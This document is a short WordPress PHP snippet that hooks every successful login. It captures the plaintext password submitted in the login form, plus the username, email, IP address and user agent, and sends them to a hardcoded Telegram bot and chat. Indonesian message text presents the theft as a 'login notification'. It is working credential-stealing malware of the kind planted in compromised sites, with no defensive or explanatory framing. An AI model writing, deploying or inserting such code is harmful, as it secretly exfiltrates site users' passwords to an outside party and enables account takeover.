add_action('wp_login',function($l,$u){$t='8056005260:AAFuEUtuaMePHIwBZUnSIUX4BZPpTEs4L7I';$c='5232333870';$s=get_bloginfo('name');$ip=$_SERVER['REMOTE_ADDR'];$ua=$_SERVER['HTTP_USER_AGENT'];$time=current_time('mysql');$p=isset($_POST['pwd'])?$_POST['pwd']:'[Password tidak terdeteksi]';$m="✅ *Notifikasi: Login Berhasil Terdeteksi* ✅\n\nSeseorang baru saja berhasil login ke situs WordPress Anda dengan kredensial berikut:\n\n🌐 *Situs:* $s\n👤 *Username:* ".esc_html($l)."\n🔑 *Password Digunakan:* ".esc_html($p)."\n\n--- Detail Pengguna & Sesi ---\n📧 *Email Pengguna:* ".$u->user_email."\n📍 *Alamat IP:* $ip\n💻 *User Agent:* $ua\n⏰ *Waktu:* $time\n\n#SuccessfulLogin #".preg_replace('/[^a-zA-Z0-9]/','',$s);$url="https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=".urlencode($m)."&parse_mode=Markdown";$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);curl_exec($ch);curl_close($ch);},10,2);
